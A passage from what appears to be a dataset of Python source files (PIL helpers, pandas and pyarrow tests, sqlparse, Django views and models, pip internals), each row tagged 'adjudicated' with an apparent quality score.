c: string containing bytes to convert<<NEWL>>    :param o: offset of bytes to convert in string<<NEWL>>    """"""<<NEWL>>    return unpack_from(""<h"", c, o)[0]<<NEWL>><<NEWL>><<NEWL>>def si16be(c, o=0):<<NEWL>>    """"""<<NEWL>>    Converts a 2-bytes (16 bits) string to a signed integer, big endian.<<NEWL>><<NEWL>>    :param c: string containing bytes to convert<<NEWL>>    :param o: offset of bytes to convert in string<<NEWL>>    """"""<<NEWL>>    return unpack_from("">h"", c, o)[0]<<NEWL>><<NEWL>><<NEWL>>def i32le(c, o=0):<<NEWL>>    """"""<<NEWL>>    Converts a 4-bytes (32 bits) string to an unsigned integer.<<NEWL>><<NEWL>>    :param c: string containing bytes to convert<<NEWL>>    :param o: offset of bytes to convert in string<<NEWL>>    """"""<<NEWL>>    return unpack_from(""<I"", c, o)[0]<<NEWL>><<NEWL>><<NEWL>>def si32le(c, o=0):<<NEWL>>    """"""<<NEWL>>    Converts a 4-bytes (32 bits) string to a signed integer.<<NEWL>><<NEWL>>    :param c: string containing bytes to convert<<NEWL>>    :param o: offset of bytes to convert in string<<NEWL>>    """"""<<NEWL>>    return unpack_from(""<i"", c, o)[0]<<NEWL>><<NEWL>><<NEWL>>def i16be(c, o=0):<<NEWL>>    return unpack_from("">H"", c, o)[0]<<NEWL>><<NEWL>><<NEWL>>def i32be(c, o=0):<<NEWL>>    return unpack_from("">I"", c, o)[0]<<NEWL>><<NEWL>><<NEWL>># Output, le = little endian, be = big endian<<NEWL>>def o16le(i):<<NEWL>>    return pack(""<H"", i)<<NEWL>><<NEWL>><<NEWL>>def o32le(i):<<NEWL>>    return pack(""<I"", i)<<NEWL>><<NEWL>><<NEWL>>def o16be(i):<<NEWL>>    return pack("">H"", i)<<NEWL>><<NEWL>><<NEWL>>def o32be(i):<<NEWL>>    return pack("">I"", i)"
72	adjudicated	4	"#<<NEWL>># Copyright 2018 the original author or authors.<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#      http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>>#<<NEWL>>from voltha.extensions.omci.tasks.get_mds_task import GetMdsTask<<NEWL>><<NEWL>><<NEWL>>class AdtnGetMdsTask(GetMdsTask):<<NEWL>>    """"""<<NEWL>>    OpenOMCI Get MIB Data Sync value task - Adtran ONU<<NEWL>><<NEWL>>    On successful completion, this task will call the 'callback' method of the<<NEWL>>    deferred returned by the start method and return the value of the MIB<<NEWL>>    Data Sync attribute of the ONT Data ME<<NEWL>>    """"""<<NEWL>>    name = ""ADTN: Get MDS Task""<<NEWL>><<NEWL>>    def __init__(self, omci_agent, device_id):<<NEWL>>        """"""<<NEWL>>        Class initialization<<NEWL>><<NEWL>>        :param omci_agent: (OmciAdapterAgent) OMCI Adapter agent<<NEWL>>        :param device_id: (str) ONU Device ID<<NEWL>>        """"""<<NEWL>>        super(AdtnGetMdsTask, self).__init__(omci_agent, device_id)<<NEWL>><<NEWL>>        self.name = AdtnGetMdsTask.name<<NEWL>>        self._device = omci_agent.get_device(device_id)<<NEWL>>        self._omci_managed = False      # TODO: Look up capabilities/model number/check handler<<NEWL>><<NEWL>>    def perform_get_mds(self):<<NEWL>>        """"""<<NEWL>>        Get the 'mib_data_sync' attribute of the ONU<<NEWL>>        """"""<<NEWL>>        self.log.info('perform-get-mds')<<NEWL>><<NEWL>>        if self._omci_managed:<<NEWL>>            return super(AdtnGetMdsTask, self).perform_get_mds()<<NEWL>><<NEWL>>        # Non-OMCI managed ADTN ONUs always return 0 for MDS, use the MIB<<NEWL>>        # sync value and depend on an accelerated mib resync to do the<<NEWL>>        # proper comparison<<NEWL>><<NEWL>>        self.deferred.callback(self._device.mib_synchronizer.mib_data_sync)<<NEWL>>"
132	adjudicated	0	"# Licensed to the Apache Software Foundation (ASF) under one<<NEWL>># or more contributor license agreements.  See the NOTICE file<<NEWL>># distributed with this work for additional information<<NEWL>># regarding copyright ownership.  The ASF licenses this file<<NEWL>># to you under the Apache License, Version 2.0 (the<<NEWL>># ""License""); you may not use this file except in compliance<<NEWL>># with the License.  You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#   http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing,<<NEWL>># software distributed under the License is distributed on an<<NEWL>># ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY<<NEWL>># KIND, either express or implied.  See the License for the<<NEWL>># specific language governing permissions and limitations<<NEWL>># under the License.<<NEWL>><<NEWL>>import weakref<<NEWL>><<NEWL>>import numpy as np<<NEWL>><<NEWL>>import pyarrow as pa<<NEWL>>from pyarrow.lib import StringBuilder<<NEWL>><<NEWL>><<NEWL>>def test_weakref():<<NEWL>>    sbuilder = StringBuilder()<<NEWL>>    wr = weakref.ref(sbuilder)<<NEWL>>    assert wr() is not None<<NEWL>>    del sbuilder<<NEWL>>    assert wr() is None<<NEWL>><<NEWL>><<NEWL>>def test_string_builder_append():<<NEWL>>    sbuilder = StringBuilder()<<NEWL>>    sbuilder.append(b""a byte string"")<<NEWL>>    sbuilder.append(""a string"")<<NEWL>>    sbuilder.append(np.nan)<<NEWL>>    sbuilder.append(None)<<NEWL>>    assert len(sbuilder) == 4<<NEWL>>    assert sbuilder.null_count == 2<<NEWL>>    arr = sbuilder.finish()<<NEWL>>    assert len(sbuilder) == 0<<NEWL>>    assert isinstance(arr, pa.Array)<<NEWL>>    assert arr.null_count == 2<<NEWL>>    assert arr.type == 'str'<<NEWL>>    expected = [""a byte string"", ""a string"", None, None]<<NEWL>>    assert arr.to_pylist() == expected<<NEWL>><<NEWL>><<NEWL>>def test_string_builder_append_values():<<NEWL>>    sbuilder = StringBuilder()<<NEWL>>    sbuilder.append_values([np.nan, None, ""text"", None, ""other text""])<<NEWL>>    assert sbuilder.null_count == 3<<NEWL>>    arr = sbuilder.finish()<<NEWL>>    assert arr.null_count == 3<<NEWL>>    expected = [None, None, ""text"", None, ""other text""]<<NEWL>>    assert arr.to_pylist() == expected<<NEWL>><<NEWL>><<NEWL>>def test_string_builder_append_after_finish():<<NEWL>>    sbuilder = StringBuilder()<<NEWL>>    sbuilder.append_values([np.nan, None, ""text"", None, ""other text""])<<NEWL>>    arr = sbuilder.finish()<<NEWL>>    sbuilder.append(""No effect"")<<NEWL>>    expected = [None, None, ""text"", None, ""other text""]<<NEWL>>    assert arr.to_pylist() == expected"
23	adjudicated	3	"#<<NEWL>># Copyright (C) 2009-2020 the sqlparse authors and contributors<<NEWL>># <see AUTHORS file><<NEWL>>#<<NEWL>># This module is part of python-sqlparse and is released under<<NEWL>># the BSD License: https://opensource.org/licenses/BSD-3-Clause<<NEWL>><<NEWL>>""""""Parse SQL statements.""""""<<NEWL>><<NEWL>># Setup namespace<<NEWL>>from sqlparse import sql<<NEWL>>from sqlparse import cli<<NEWL>>from sqlparse import engine<<NEWL>>from sqlparse import tokens<<NEWL>>from sqlparse import filters<<NEWL>>from sqlparse import formatter<<NEWL>><<NEWL>><<NEWL>>__version__ = '0.4.3'<<NEWL>>__all__ = ['engine', 'filters', 'formatter', 'sql', 'tokens', 'cli']<<NEWL>><<NEWL>><<NEWL>>def parse(sql, encoding=None):<<NEWL>>    """"""Parse sql and return a list of statements.<<NEWL>><<NEWL>>    :param sql: A string containing one or more SQL statements.<<NEWL>>    :param encoding: The encoding of the statement (optional).<<NEWL>>    :returns: A tuple of :class:`~sqlparse.sql.Statement` instances.<<NEWL>>    """"""<<NEWL>>    return tuple(parsestream(sql, encoding))<<NEWL>><<NEWL>><<NEWL>>def parsestream(stream, encoding=None):<<NEWL>>    """"""Parses sql statements from file-like object.<<NEWL>><<NEWL>>    :param stream: A file-like object.<<NEWL>>    :param encoding: The encoding of the stream contents (optional).<<NEWL>>    :returns: A generator of :class:`~sqlparse.sql.Statement` instances.<<NEWL>>    """"""<<NEWL>>    stack = engine.FilterStack()<<NEWL>>    stack.enable_grouping()<<NEWL>>    return stack.run(stream, encoding)<<NEWL>><<NEWL>><<NEWL>>def format(sql, encoding=None, **options):<<NEWL>>    """"""Format *sql* according to *options*.<<NEWL>><<NEWL>>    Available options are documented in :ref:`formatting`.<<NEWL>><<NEWL>>    In addition to the formatting options this function accepts the<<NEWL>>    keyword ""encoding"" which determines the encoding of the statement.<<NEWL>><<NEWL>>    :returns: The formatted SQL statement as string.<<NEWL>>    """"""<<NEWL>>    stack = engine.FilterStack()<<NEWL>>    options = formatter.validate_options(options)<<NEWL>>    stack = formatter.build_filter_stack(stack, options)<<NEWL>>    stack.postprocess.append(filters.SerializerUnicode())<<NEWL>>    return ''.join(stack.run(sql, encoding))<<NEWL>><<NEWL>><<NEWL>>def split(sql, encoding=None):<<NEWL>>    """"""Split *sql* into single statements.<<NEWL>><<NEWL>>    :param sql: A string containing one or more SQL statements.<<NEWL>>    :param encoding: The encoding of the statement (optional).<<NEWL>>    :returns: A list of strings.<<NEWL>>    """"""<<NEWL>>    stack = engine.FilterStack()<<NEWL>>    return [str(stmt).strip() for stmt in stack.run(sql, encoding)]"
163	adjudicated	0	"from __future__ import annotations<<NEWL>><<NEWL>>from typing import TYPE_CHECKING<<NEWL>><<NEWL>>from components.base_component import BaseComponent<<NEWL>><<NEWL>>if TYPE_CHECKING:<<NEWL>>    from entity import Actor<<NEWL>><<NEWL>><<NEWL>>class Level(BaseComponent):<<NEWL>>    parent: Actor<<NEWL>><<NEWL>>    def __init__(<<NEWL>>        self,<<NEWL>>        current_level: int = 1,<<NEWL>>        current_xp: int = 0,<<NEWL>>        level_up_base: int = 0,<<NEWL>>        level_up_factor: int = 150,<<NEWL>>        xp_given: int = 0,<<NEWL>>    ):<<NEWL>>        self.current_level = current_level<<NEWL>>        self.current_xp = current_xp<<NEWL>>        self.level_up_base = level_up_base<<NEWL>>        self.level_up_factor = level_up_factor<<NEWL>>        self.xp_given = xp_given<<NEWL>><<NEWL>>    @property<<NEWL>>    def experience_to_next_level(self) -> int:<<NEWL>>        return self.level_up_base + self.current_level * self.level_up_factor<<NEWL>><<NEWL>>    @property<<NEWL>>    def requires_level_up(self) -> bool:<<NEWL>>        return self.current_xp > self.experience_to_next_level<<NEWL>><<NEWL>>    def add_xp(self, xp: int) -> None:<<NEWL>>        if xp == 0 or self.level_up_base == 0:<<NEWL>>            return<<NEWL>><<NEWL>>        self.current_xp += xp<<NEWL>><<NEWL>>        self.engine.message_log.add_message(f""You gain {xp} experience points."")<<NEWL>><<NEWL>>        if self.requires_level_up:<<NEWL>>            self.engine.message_log.add_message(<<NEWL>>                f""You advance to level {self.current_level + 1}!""<<NEWL>>            )<<NEWL>><<NEWL>>    def increase_level(self) -> None:<<NEWL>>        self.current_xp -= self.experience_to_next_level<<NEWL>><<NEWL>>        self.current_level += 1<<NEWL>><<NEWL>>    def increase_max_hp(self, amount: int = 20) -> None:<<NEWL>>        self.parent.fighter.max_hp += amount<<NEWL>>        self.parent.fighter.hp += amount<<NEWL>><<NEWL>>        self.engine.message_log.add_message(""Your health improves!"")<<NEWL>><<NEWL>>        self.increase_level()<<NEWL>><<NEWL>>    def increase_power(self, amount: int = 1) -> None:<<NEWL>>        self.parent.fighter.base_power += amount<<NEWL>><<NEWL>>        self.engine.message_log.add_message(""You feel stronger!"")<<NEWL>><<NEWL>>        self.increase_level()<<NEWL>><<NEWL>>    def increase_defense(self, amount: int = 1) -> None:<<NEWL>>        self.parent.fighter.base_defense += amount<<NEWL>><<NEWL>>        self.engine.message_log.add_message(""Your movements are getting swifter!"")<<NEWL>><<NEWL>>        self.increase_level()"
341	adjudicated	2	"from django.db import models<<NEWL>>from django.contrib.auth.models import User<<NEWL>>from io import BytesIO<<NEWL>>import sys<<NEWL>>print(sys.path)<<NEWL>>from PIL import Image<<NEWL>>from django.core.files.uploadedfile import InMemoryUploadedFile<<NEWL>><<NEWL>><<NEWL>># Create your models here.<<NEWL>><<NEWL>>class Blog_Post(models.Model, object):<<NEWL>>    image = models.ImageField(blank= True, upload_to='get_upload_file_name')<<NEWL>>    title = models.CharField(blank=True, max_length = 100)<<NEWL>>    summary = models.TextField(blank= True, max_length =30)<<NEWL>>    body = models.TextField(blank=True)<<NEWL>>    slug = models.SlugField( unique=True)<<NEWL>>    writer = models.ForeignKey(User,on_delete= models.CASCADE)<<NEWL>>    created_on = models.DateTimeField(auto_now_add=True)<<NEWL>><<NEWL>>    def __str__(self) -> str:<<NEWL>>        return self.title<<NEWL>>    def save(self):<<NEWL>>        # Opening the uploaded image<<NEWL>>        im = Image.open(self.image)<<NEWL>><<NEWL>>        output = BytesIO()<<NEWL>><<NEWL>>        # Resize/modify the image<<NEWL>>        im = im.resize((1024, 720))<<NEWL>><<NEWL>>        # after modifications, save it to the output<<NEWL>>        im.save(output, format='png', quality=300)<<NEWL>>        output.seek(0)<<NEWL>><<NEWL>>        # change the imagefield value to be the newley modifed image value<<NEWL>>        self.image = InMemoryUploadedFile(output, 'ImageField', ""%s.webp"" % self.image.name.split('.')[0], 'image/webp',<<NEWL>>                                        sys.getsizeof(output), None)<<NEWL>><<NEWL>>        super(Blog_Post, self).save()<<NEWL>><<NEWL>>class Comment(models.Model):<<NEWL>>        commenter = models.CharField(max_length=15)<<NEWL>>        body = models.TextField(max_length=30, blank=True)<<NEWL>>        post = models.ForeignKey(Blog_Post, on_delete=models.CASCADE, related_name='comments')<<NEWL>>        date = models.DateField(auto_now_add=True)<<NEWL>>        like = models.BooleanField(default=True)<<NEWL>>        def __str__(self) -> str:<<NEWL>>             return self.commenter<<NEWL>><<NEWL>><<NEWL>><<NEWL>>class Meta:<<NEWL>>    ordering = ('-created_at',)<<NEWL>><<NEWL>>   "
190	adjudicated	2	"import logging<<NEWL>><<NEWL>>""""""<<NEWL>>_logging.py<<NEWL>>websocket - WebSocket client library for Python<<NEWL>><<NEWL>>Copyright 2022 engn33r<<NEWL>><<NEWL>>Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>>you may not use this file except in compliance with the License.<<NEWL>>You may obtain a copy of the License at<<NEWL>><<NEWL>>    http://www.apache.org/licenses/LICENSE-2.0<<NEWL>><<NEWL>>Unless required by applicable law or agreed to in writing, software<<NEWL>>distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>>WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>>See the License for the specific language governing permissions and<<NEWL>>limitations under the License.<<NEWL>>""""""<<NEWL>><<NEWL>>_logger = logging.getLogger('websocket')<<NEWL>>try:<<NEWL>>    from logging import NullHandler<<NEWL>>except ImportError:<<NEWL>>    class NullHandler(logging.Handler):<<NEWL>>        def emit(self, record):<<NEWL>>            pass<<NEWL>><<NEWL>>_logger.addHandler(NullHandler())<<NEWL>><<NEWL>>_traceEnabled = False<<NEWL>><<NEWL>>__all__ = [""enableTrace"", ""dump"", ""error"", ""warning"", ""debug"", ""trace"",<<NEWL>>           ""isEnabledForError"", ""isEnabledForDebug"", ""isEnabledForTrace""]<<NEWL>><<NEWL>><<NEWL>>def enableTrace(traceable, handler=logging.StreamHandler(), level=""DEBUG""):<<NEWL>>    """"""<<NEWL>>    Turn on/off the traceability.<<NEWL>><<NEWL>>    Parameters<<NEWL>>    ----------<<NEWL>>    traceable: bool<<NEWL>>        If set to True, traceability is enabled.<<NEWL>>    """"""<<NEWL>>    global _traceEnabled<<NEWL>>    _traceEnabled = traceable<<NEWL>>    if traceable:<<NEWL>>        _logger.addHandler(handler)<<NEWL>>        _logger.setLevel(getattr(logging, level))<<NEWL>><<NEWL>><<NEWL>>def dump(title, message):<<NEWL>>    if _traceEnabled:<<NEWL>>        _logger.debug(""--- "" + title + "" ---"")<<NEWL>>        _logger.debug(message)<<NEWL>>        _logger.debug(""-----------------------"")<<NEWL>><<NEWL>><<NEWL>>def error(msg):<<NEWL>>    _logger.error(msg)<<NEWL>><<NEWL>><<NEWL>>def warning(msg):<<NEWL>>    _logger.warning(msg)<<NEWL>><<NEWL>><<NEWL>>def debug(msg):<<NEWL>>    _logger.debug(msg)<<NEWL>><<NEWL>><<NEWL>>def info(msg):<<NEWL>>    _logger.info(msg)<<NEWL>><<NEWL>><<NEWL>>def trace(msg):<<NEWL>>    if _traceEnabled:<<NEWL>>        _logger.debug(msg)<<NEWL>><<NEWL>><<NEWL>>def isEnabledForError():<<NEWL>>    return _logger.isEnabledFor(logging.ERROR)<<NEWL>><<NEWL>><<NEWL>>def isEnabledForDebug():<<NEWL>>    return _logger.isEnabledFor(logging.DEBUG)<<NEWL>><<NEWL>><<NEWL>>def isEnabledForTrace():<<NEWL>>    return _traceEnabled"
201	adjudicated	1	"import re<<NEWL>><<NEWL>>import pytest<<NEWL>><<NEWL>>import pandas._testing as tm<<NEWL>><<NEWL>>from pandas.io.excel import ExcelWriter<<NEWL>><<NEWL>>odf = pytest.importorskip(""odf"")<<NEWL>><<NEWL>>pytestmark = pytest.mark.parametrize(""ext"", ["".ods""])<<NEWL>><<NEWL>><<NEWL>>def test_write_append_mode_raises(ext):<<NEWL>>    msg = ""Append mode is not supported with odf!""<<NEWL>><<NEWL>>    with tm.ensure_clean(ext) as f:<<NEWL>>        with pytest.raises(ValueError, match=msg):<<NEWL>>            ExcelWriter(f, engine=""odf"", mode=""a"")<<NEWL>><<NEWL>><<NEWL>>def test_kwargs(ext):<<NEWL>>    # GH 42286<<NEWL>>    # GH 43445<<NEWL>>    # test for error: OpenDocumentSpreadsheet does not accept any arguments<<NEWL>>    kwargs = {""kwarg"": 1}<<NEWL>>    with tm.ensure_clean(ext) as f:<<NEWL>>        msg = re.escape(""Use of **kwargs is deprecated"")<<NEWL>>        error = re.escape(<<NEWL>>            ""OpenDocumentSpreadsheet() got an unexpected keyword argument 'kwarg'""<<NEWL>>        )<<NEWL>>        with pytest.raises(<<NEWL>>            TypeError,<<NEWL>>            match=error,<<NEWL>>        ):<<NEWL>>            with tm.assert_produces_warning(FutureWarning, match=msg):<<NEWL>>                with ExcelWriter(f, engine=""odf"", **kwargs) as _:<<NEWL>>                    pass<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.parametrize(""engine_kwargs"", [None, {""kwarg"": 1}])<<NEWL>>def test_engine_kwargs(ext, engine_kwargs):<<NEWL>>    # GH 42286<<NEWL>>    # GH 43445<<NEWL>>    # test for error: OpenDocumentSpreadsheet does not accept any arguments<<NEWL>>    with tm.ensure_clean(ext) as f:<<NEWL>>        if engine_kwargs is not None:<<NEWL>>            error = re.escape(<<NEWL>>                ""OpenDocumentSpreadsheet() got an unexpected keyword argument 'kwarg'""<<NEWL>>            )<<NEWL>>            with pytest.raises(<<NEWL>>                TypeError,<<NEWL>>                match=error,<<NEWL>>            ):<<NEWL>>                ExcelWriter(f, engine=""odf"", engine_kwargs=engine_kwargs)<<NEWL>>        else:<<NEWL>>            with ExcelWriter(f, engine=""odf"", engine_kwargs=engine_kwargs) as _:<<NEWL>>                pass<<NEWL>><<NEWL>><<NEWL>>def test_book_and_sheets_consistent(ext):<<NEWL>>    # GH#45687 - Ensure sheets is updated if user modifies book<<NEWL>>    with tm.ensure_clean(ext) as f:<<NEWL>>        with ExcelWriter(f) as writer:<<NEWL>>            assert writer.sheets == {}<<NEWL>>            table = odf.table.Table(name=""test_name"")<<NEWL>>            writer.book.spreadsheet.addElement(table)<<NEWL>>            assert writer.sheets == {""test_name"": table}"
81	adjudicated	0	"from django.contrib.messages.views import SuccessMessageMixin<<NEWL>>from django.views.generic import CreateView, ListView, UpdateView, DeleteView<<NEWL>>from django.urls import reverse_lazy<<NEWL>>from .forms import HouseForm<<NEWL>>from .mixins import CountFlatsMixin, ImageResizeBeforeMixin<<NEWL>>from .models import House<<NEWL>>from django.utils.translation import gettext_lazy as _<<NEWL>>from ..mixins import LoginRequiredMixinCustom<<NEWL>><<NEWL>><<NEWL>>class HouseCreateView(LoginRequiredMixinCustom, ImageResizeBeforeMixin,<<NEWL>>                      SuccessMessageMixin, CreateView):<<NEWL>>    form_class = HouseForm<<NEWL>>    template_name = ""house/create.html""<<NEWL>>    success_url = reverse_lazy('house_list')<<NEWL>>    extra_context = {<<NEWL>>        'header': _('Create house'),<<NEWL>>        'button_title': _('Create'),<<NEWL>>        'langs': House.get_lang_list_qs(),<<NEWL>>    }<<NEWL>>    success_message = _('House created successfully')<<NEWL>><<NEWL>><<NEWL>>class HouseUpdateView(LoginRequiredMixinCustom, ImageResizeBeforeMixin,<<NEWL>>                      SuccessMessageMixin, UpdateView):<<NEWL>>    model = House<<NEWL>>    form_class = HouseForm<<NEWL>>    template_name = ""house/create.html""<<NEWL>>    success_url = reverse_lazy('house_list')<<NEWL>>    extra_context = {<<NEWL>>        'header': _('Update house'),<<NEWL>>        'button_title': _('Update'),<<NEWL>>        'langs': House.get_lang_list_qs(),<<NEWL>>    }<<NEWL>>    success_message = _('House updated successfully')<<NEWL>><<NEWL>><<NEWL>>class HouseListView(LoginRequiredMixinCustom, CountFlatsMixin, ListView):<<NEWL>>    model = House<<NEWL>>    template_name = ""house/list.html""<<NEWL>>    extra_context = {<<NEWL>>        'remove_title': _('remove'),<<NEWL>>    }<<NEWL>>    ordering = 'address'<<NEWL>><<NEWL>><<NEWL>>class HouseDeleteView(LoginRequiredMixinCustom,<<NEWL>>                      SuccessMessageMixin, DeleteView):<<NEWL>>    model = House<<NEWL>>    template_name = ""house/delete.html""<<NEWL>>    success_url = reverse_lazy('house_list')<<NEWL>>    extra_context = {<<NEWL>>        'header': _('Remove house'),<<NEWL>>        'button_title': _('Remove '),<<NEWL>>        'message': _('Are you sure delete house '),<<NEWL>>    }<<NEWL>>    success_message = _('House deleted successfully')"
310	adjudicated	1	"from datetime import datetime<<NEWL>><<NEWL>>import pytest<<NEWL>><<NEWL>>from pandas._libs import tslib<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.parametrize(<<NEWL>>    ""date_str, exp"",<<NEWL>>    [<<NEWL>>        (""2011-01-02"", datetime(2011, 1, 2)),<<NEWL>>        (""2011-1-2"", datetime(2011, 1, 2)),<<NEWL>>        (""2011-01"", datetime(2011, 1, 1)),<<NEWL>>        (""2011-1"", datetime(2011, 1, 1)),<<NEWL>>        (""2011 01 02"", datetime(2011, 1, 2)),<<NEWL>>        (""2011.01.02"", datetime(2011, 1, 2)),<<NEWL>>        (""2011/01/02"", datetime(2011, 1, 2)),<<NEWL>>        (""2011\\01\\02"", datetime(2011, 1, 2)),<<NEWL>>        (""2013-01-01 05:30:00"", datetime(2013, 1, 1, 5, 30)),<<NEWL>>        (""2013-1-1 5:30:00"", datetime(2013, 1, 1, 5, 30)),<<NEWL>>    ],<<NEWL>>)<<NEWL>>def test_parsers_iso8601(date_str, exp):<<NEWL>>    # see gh-12060<<NEWL>>    #<<NEWL>>    # Test only the ISO parser - flexibility to<<NEWL>>    # different separators and leading zero's.<<NEWL>>    actual = tslib._test_parse_iso8601(date_str)<<NEWL>>    assert actual == exp<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.parametrize(<<NEWL>>    ""date_str"",<<NEWL>>    [<<NEWL>>        ""2011-01/02"",<<NEWL>>        ""2011=11=11"",<<NEWL>>        ""201401"",<<NEWL>>        ""201111"",<<NEWL>>        ""200101"",<<NEWL>>        # Mixed separated and unseparated.<<NEWL>>        ""2005-0101"",<<NEWL>>        ""200501-01"",<<NEWL>>        ""20010101 12:3456"",<<NEWL>>        ""20010101 1234:56"",<<NEWL>>        # HHMMSS must have two digits in<<NEWL>>        # each component if unseparated.<<NEWL>>        ""20010101 1"",<<NEWL>>        ""20010101 123"",<<NEWL>>        ""20010101 12345"",<<NEWL>>        ""20010101 12345Z"",<<NEWL>>    ],<<NEWL>>)<<NEWL>>def test_parsers_iso8601_invalid(date_str):<<NEWL>>    msg = f'Error parsing datetime string ""{date_str}""'<<NEWL>><<NEWL>>    with pytest.raises(ValueError, match=msg):<<NEWL>>        tslib._test_parse_iso8601(date_str)<<NEWL>><<NEWL>><<NEWL>>def test_parsers_iso8601_invalid_offset_invalid():<<NEWL>>    date_str = ""2001-01-01 12-34-56""<<NEWL>>    msg = f'Timezone hours offset out of range in datetime string ""{date_str}""'<<NEWL>><<NEWL>>    with pytest.raises(ValueError, match=msg):<<NEWL>>        tslib._test_parse_iso8601(date_str)<<NEWL>><<NEWL>><<NEWL>>def test_parsers_iso8601_leading_space():<<NEWL>>    # GH#25895 make sure isoparser doesn't overflow with long input<<NEWL>>    date_str, expected = (""2013-1-1 5:30:00"", datetime(2013, 1, 1, 5, 30))<<NEWL>>    actual = tslib._test_parse_iso8601("" "" * 200 + date_str)<<NEWL>>    assert actual == expected"
250	adjudicated	0	"""""""Text field.""""""<<NEWL>><<NEWL>>import gws<<NEWL>>import gws.base.database.sql as sql<<NEWL>>import gws.base.database.model<<NEWL>>import gws.types as t<<NEWL>><<NEWL>>from .. import scalar<<NEWL>><<NEWL>>gws.ext.new.modelField('text')<<NEWL>><<NEWL>><<NEWL>>class SearchType(t.Enum):<<NEWL>>    exact = 'exact'<<NEWL>>    begin = 'begin'<<NEWL>>    end = 'end'<<NEWL>>    any = 'any'<<NEWL>>    like = 'like'<<NEWL>><<NEWL>><<NEWL>>class Search(gws.Data):<<NEWL>>    type: SearchType<<NEWL>>    minLength: int<<NEWL>>    caseSensitive: bool<<NEWL>><<NEWL>><<NEWL>>class SearchConfig(gws.Config):<<NEWL>>    type: SearchType<<NEWL>>    minLength: int = 0<<NEWL>>    caseSensitive: bool = False<<NEWL>><<NEWL>><<NEWL>>class Config(scalar.Config):<<NEWL>>    textSearch: t.Optional[SearchConfig]<<NEWL>><<NEWL>><<NEWL>>class Props(scalar.Props):<<NEWL>>    pass<<NEWL>><<NEWL>><<NEWL>>class Object(scalar.Object):<<NEWL>>    attributeType = gws.AttributeType.str<<NEWL>>    textSearch: t.Optional[Search]<<NEWL>><<NEWL>>    def configure(self):<<NEWL>>        self.textSearch = None<<NEWL>>        p = self.var('textSearch')<<NEWL>>        if p:<<NEWL>>            self.textSearch = Search(<<NEWL>>                type=p.get('type', SearchType.exact),<<NEWL>>                minLength=p.get('minLength', 0),<<NEWL>>                caseSensitive=p.get('caseSensitive', False),<<NEWL>>            )<<NEWL>><<NEWL>>    def sa_select(self, sel, user):<<NEWL>>        sel = t.cast(sql.SelectStatement, sel)<<NEWL>><<NEWL>>        if not self.textSearch or not sel.search or not sel.search.keyword:<<NEWL>>            return<<NEWL>><<NEWL>>        kw = sel.search.keyword<<NEWL>>        so = self.textSearch<<NEWL>>        if so.minLength and len(kw) < so.minLength:<<NEWL>>            return<<NEWL>><<NEWL>>        mod = t.cast(gws.base.database.model.Object, self.model)<<NEWL>>        fld = sql.sa.sql.cast(<<NEWL>>            getattr(mod.sa_class(), self.name),<<NEWL>>            sql.sa.String)<<NEWL>><<NEWL>>        if so.type == SearchType.exact:<<NEWL>>            sel.keywordWhere.append(fld == kw)<<NEWL>>        else:<<NEWL>>            kw = sql.escape_like(kw)<<NEWL>>            if so.type == 'any':<<NEWL>>                kw = '%' + kw + '%'<<NEWL>>            if so.type == 'begin':<<NEWL>>                kw = kw + '%'<<NEWL>>            if so.type == 'end':<<NEWL>>                kw = '%' + kw<<NEWL>><<NEWL>>            if so.caseSensitive:<<NEWL>>                sel.keywordWhere.append(fld.like(kw, escape='\\'))<<NEWL>>            else:<<NEWL>>                sel.keywordWhere.append(fld.ilike(kw, escape='\\'))"
471	adjudicated	2	"""""""Metadata generation logic for legacy source distributions.<<NEWL>>""""""<<NEWL>><<NEWL>>import logging<<NEWL>>import os<<NEWL>><<NEWL>>from pip._internal.build_env import BuildEnvironment<<NEWL>>from pip._internal.exceptions import InstallationError<<NEWL>>from pip._internal.utils.setuptools_build import make_setuptools_egg_info_args<<NEWL>>from pip._internal.utils.subprocess import call_subprocess<<NEWL>>from pip._internal.utils.temp_dir import TempDirectory<<NEWL>><<NEWL>>logger = logging.getLogger(__name__)<<NEWL>><<NEWL>><<NEWL>>def _find_egg_info(directory):<<NEWL>>    # type: (str) -> str<<NEWL>>    """"""Find an .egg-info subdirectory in `directory`.<<NEWL>>    """"""<<NEWL>>    filenames = [<<NEWL>>        f for f in os.listdir(directory) if f.endswith("".egg-info"")<<NEWL>>    ]<<NEWL>><<NEWL>>    if not filenames:<<NEWL>>        raise InstallationError(<<NEWL>>            f""No .egg-info directory found in {directory}""<<NEWL>>        )<<NEWL>><<NEWL>>    if len(filenames) > 1:<<NEWL>>        raise InstallationError(<<NEWL>>            ""More than one .egg-info directory found in {}"".format(<<NEWL>>                directory<<NEWL>>            )<<NEWL>>        )<<NEWL>><<NEWL>>    return os.path.join(directory, filenames[0])<<NEWL>><<NEWL>><<NEWL>>def generate_metadata(<<NEWL>>    build_env,  # type: BuildEnvironment<<NEWL>>    setup_py_path,  # type: str<<NEWL>>    source_dir,  # type: str<<NEWL>>    isolated,  # type: bool<<NEWL>>    details,  # type: str<<NEWL>>):<<NEWL>>    # type: (...) -> str<<NEWL>>    """"""Generate metadata using setup.py-based defacto mechanisms.<<NEWL>><<NEWL>>    Returns the generated metadata directory.<<NEWL>>    """"""<<NEWL>>    logger.debug(<<NEWL>>        'Running setup.py (path:%s) egg_info for package %s',<<NEWL>>        setup_py_path, details,<<NEWL>>    )<<NEWL>><<NEWL>>    egg_info_dir = TempDirectory(<<NEWL>>        kind=""pip-egg-info"", 